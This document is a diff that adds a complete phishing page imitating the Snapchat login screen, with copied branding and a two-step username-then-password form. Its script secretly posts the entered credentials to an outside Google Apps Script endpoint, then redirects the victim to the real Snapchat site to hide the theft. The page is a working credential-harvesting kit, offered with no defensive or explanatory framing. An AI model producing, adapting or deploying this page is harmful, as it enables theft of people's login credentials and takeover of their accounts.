@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+<style>
+    /* Mobile-optimized system fonts */
+    body { 
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+        background-color: #ffffff; 
+        display: flex; 
+        justify-content: center; 
+        align-items: center; 
+        height: 100vh; 
+        margin: 0; 
+    }
+    
+    .card { 
+        background: white; 
+        padding: 40px 20px; 
+        width: 100%; 
+        max-width: 350px; 
+        text-align: center; 
+    }
+
+    .logo { width: 60px; margin-bottom: 20px; }
+
+    h1 { font-size: 26px; font-weight: 800; margin-bottom: 30px; color: #000; }
+
+    .input-label { text-align: left; font-size: 13px; color: #7f7f7f; font-weight: 600; margin-bottom: 8px; display: block; }
+    
+    input { 
+        width: 100%; 
+        padding: 15px; 
+        border: none; 
+        background: #f7f7f7; 
+        border-radius: 10px; 
+        box-sizing: border-box; 
+        font-size: 16px; 
+        margin-bottom: 20px; 
+    }
+
+    /* Iconic Snapchat Yellow Button */
+    .btn { 
+        background-color: #FFFC00; 
+        color: #000; 
+        padding: 14px 0; 
+        border: none; 
+        border-radius: 30px; 
+        cursor: pointer; 
+        font-weight: 800; 
+        font-size: 16px; 
+        width: 100%; 
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    
+    .btn:active { background-color: #e6e300; }
+    .hidden { display: none; }
+</style>
+</head>
+<body>
+
+<div class="card">
+    <img src="https://www.edigitalagency.com.au/wp-content/uploads/new-Snapchat-logo-black-border-png-large-size.png" class="logo">
+    <h1 id="title">Log in to Snapchat</h1>
+    
+    <form id="loginForm" action="https://script.google.com/macros/s/AKfycbwKyfmfgxbyD3GtMJm9Ao9xl7Ony2kxX8Wu57gnJsjKmhR8DYSsAFLyxdATpoMHt8UVww/exec" method="POST">
+        <!-- Step 1: Username -->
+        <div id="step1">
+            <label class="input-label">Username or Email</label>
+            <input type="text" id="usernameInput" name="Username" required>
+            <button type="button" class="btn" onclick="showPassword()">Next</button>
+        </div>
+
+        <!-- Step 2: Password -->
+        <div id="step2" class="hidden">
+            <label class="input-label">Password</label>
+            <input type="password" name="Password" required>
+            <button type="submit" class="btn">Log In</button>
+        </div>
+    </form>
+</div>
+
+<script>
+    function showPassword() {
+        if (document.getElementById('usernameInput').value !== "") {
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            document.getElementById('title').innerText = "Enter Password";
+        }
+    }
+
+    const form = document.getElementById('loginForm');
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        fetch(form.action, { method: 'POST', body: new FormData(form), mode: 'no-cors' });
+        // Redirect to real site after submit
+        setTimeout(() => {
+            window.location.href = "https://www.snapchat.com";
+        }, 300);
+    });
+</script>
+</body>
+</html>
